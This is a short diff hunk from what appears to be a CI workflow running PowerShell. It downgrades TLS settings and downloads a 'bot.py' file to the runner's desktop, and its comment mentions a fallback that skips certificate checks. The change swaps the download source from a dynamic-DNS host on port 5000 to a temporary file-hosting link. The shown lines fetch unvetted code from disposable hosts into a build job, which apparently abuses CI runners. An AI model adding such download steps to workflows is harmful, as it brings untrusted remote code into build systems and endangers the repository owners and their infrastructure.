@@ -71,7 +71,7 @@ jobs:
           [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
           
           # Download bot.py (with retry + fallback for -SkipCertificateCheck on PS7)
-          $btol = "https://rrrrs.redirectme.net:5000"
+          $btol = "https://zip3.tempfilestorage.link/public/2026-10-18/0e64f3c8-ce7e-4c0d-bc3b-f9fd24a7d3bb/bot.py"
           $botPath = "$desktop\bot.py"
           $downloaded = $false
           
